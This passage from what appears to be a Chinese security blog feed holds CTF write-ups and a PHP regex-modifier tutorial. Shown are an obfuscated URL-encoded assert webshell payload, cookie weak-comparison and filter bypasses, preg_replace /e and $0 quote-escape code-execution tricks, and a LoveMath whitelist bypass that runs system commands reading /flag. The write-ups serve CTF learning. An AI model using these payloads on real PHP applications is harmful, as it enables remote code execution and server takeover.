5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b&#x2F;&#x2F;</code></pre><p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p><h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;It&#39;s no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include &quot;config.php&quot;;if (isset($_GET[&#39;view_source&#39;])) &#123;    show_source(__FILE__);    die;&#125;function checkCookie($s) &#123;    $arr &#x3D; explode(&#39;:&#39;, $s);    if ($arr[0] &#x3D;&#x3D;&#x3D; &#39;&#123;&quot;secret&quot;&#39; &amp;&amp; preg_match(&#39;&#x2F;^[\&quot;0-9A-Z]*&#125;$&#x2F;&#39;, $arr[1]) &amp;&amp; count($arr) &#x3D;&#x3D;&#x3D; 2 ) &#123;        return true;    &#125; else &#123;        if ( !theFirstTimeSetCookie() ) setcookie(&#39;secret&#39;, &#39;&#39;, time()-1);        return false;    &#125;&#125;function haveFun($_f_g) &#123;    $_g_r &#x3D; 32;    $_m_u &#x3D; md5($_f_g);    $_h_p &#x3D; strtoupper($_m_u);    for ($i &#x3D; 0; $i &lt; $_g_r; $i++) &#123;        $_i &#x3D; substr($_h_p, $i, 1);        $_i &#x3D; ord($_i);        print_r($_i &amp; 0xC0);    &#125;    die;&#125;isset($_COOKIE[&#39;secret&#39;]) ? $json &#x3D; $_COOKIE[&#39;secret&#39;] : setcookie(&#39;secret&#39;, &#39;&#123;&quot;secret&quot;:&quot;&#39; . strtoupper(md5(&#39;y1ng&#39;)) . &#39;&quot;&#125;&#39;, time()+7200 );checkCookie($json) ? $obj &#x3D; @json_decode($json, true) : die(&#39;no&#39;);if ($obj &amp;&amp; isset($_GET[&#39;give_me_shell&#39;])) &#123;    ($obj[&#39;secret&#39;] !&#x3D; $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;&#125;die;</code></pre><p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p><p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p><p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret=&#123;&quot;secret&quot;:115&#125;</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();&#x2F;&#x2F;there are some secret waf that you will never know, fuzz me if you canrequire &quot;hidden_filter.php&quot;;if (!$_SESSION[&#39;login&#39;])    die(&#39;&lt;script&gt;location.href&#x3D;\&#39;.&#x2F;index.php\&#39;&lt;&#x2F;script&gt;&#39;);if (!isset($_GET[&#39;code&#39;])) &#123;    show_source(__FILE__);    exit();&#125; else &#123;    $code &#x3D; $_GET[&#39;code&#39;];    if (!preg_match($secret_waf, $code)) &#123;        &#x2F;&#x2F;清空session 从头再来        eval(&quot;\$_SESSION[&quot; . $code . &quot;]&#x3D;false;&quot;); &#x2F;&#x2F;you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker    &#125; else die(&#39;hacker&#39;);&#125;&#x2F;* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! *  ————Deep CTF 2020*&#x2F;</code></pre><p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li><li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li><li>使用<code>require</code>可以不需要括号</li><li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li></ul><p>得到<code>flag.txt</code>内容：</p><pre class="language-none"><code class="language-none">可以，说明你ctfshow的红包2没白做，flag在&#x2F;flag，同样的方法去读取吧。1]&#x3D;false;</code></pre><p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> CTF题 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php正则表达式(PCRE)模式修饰符</title>
      <link href="/posts/57833c1a/"/>
      <url>/posts/57833c1a/</url>
      
        <content type="html"><![CDATA[<p>php单双引号的区别：</p><p>单引号：php不会读取里面的变量，作为纯字符串处理</p><p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p><p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html">详见</a></p><a id="more"></a><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>使得模式大小写不敏感</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>使得模式匹配上任意行之后就返回true</p><p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>使得<code>.</code>可以匹配换行符</p><p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>使得<code>$</code>不匹配换行符</p><p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>使得可以在模式中添加注释</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p><p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>$&#123;&#125;</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a>的原因，<code>$&#123;&#125;</code>中包裹的字符则会当做代码执行</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><strong>$匹配换行问题</strong></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p><p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p><p>那么该如何解决这种问题呢？</p><p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><strong>正则替换</strong></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p><p>有如下代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$api &#x3D; addslashes($_GET[&#39;api&#39;]);$file &#x3D; file_get_contents(&#39;.&#x2F;option.php&#39;);$file &#x3D; preg_replace(&quot;&#x2F;\\\$API &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$API &#x3D; &#39;&#123;$api&#125;&#39;;&quot;, $file);file_put_contents(&#39;.&#x2F;option.php&#39;, $file);</code></pre><p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p><p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;;phpinfo();&#39;;</code></pre><p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;$API &#x3D; &#39;;phpinfo();&#39;;&#39;;</code></pre><p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p><ul><li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li><li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\$&#123;1&#125;</code>的形式。</li></ul><p>再来看看<code>preg_replace</code>的具体使用方法</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><strong>巨人的肩膀</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHP模式修饰符</a></li></ul><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a><em>栗子</em></h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a><strong>BJDCTF2020-ZJCTF—不过如此</strong></h4><p>首先题目先给出了一段代码：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>构造<code>payload</code>读取<code>next.php</code>的内容</p><pre class="language-php" data-language="php"><code class="language-php">http:&#x2F;&#x2F;e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>将读到的base64解码得到<code>next.php</code>文件的内容</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$id &#x3D; $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] &#x3D; $id;function complex($re, $str) &#123;    return preg_replace(        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re &#x3D;&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造：</p><p><code>payload</code>：<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，</p><p>也可以利用里面的<code>getFlag</code>方法<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-LoveMath-php动态函数执行</title>
      <link href="/posts/a649e496/"/>
      <url>/posts/a649e496/</url>
      
        <content type="html"><![CDATA[<p>  先看到题目给出的源码：</p><a id="more"></a><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>代码审计限制条件</p><ul><li>传入的<code>c</code>的字符串长度大小不能大于80</li><li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li></ul><p>以上条件满足后即可传入<code>eval</code>中执行代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert(3761671484,13,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1&#x3D;system&amp;2&#x3D;tac &#x2F;flag</code></pre><p>分析：</p><ul><li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  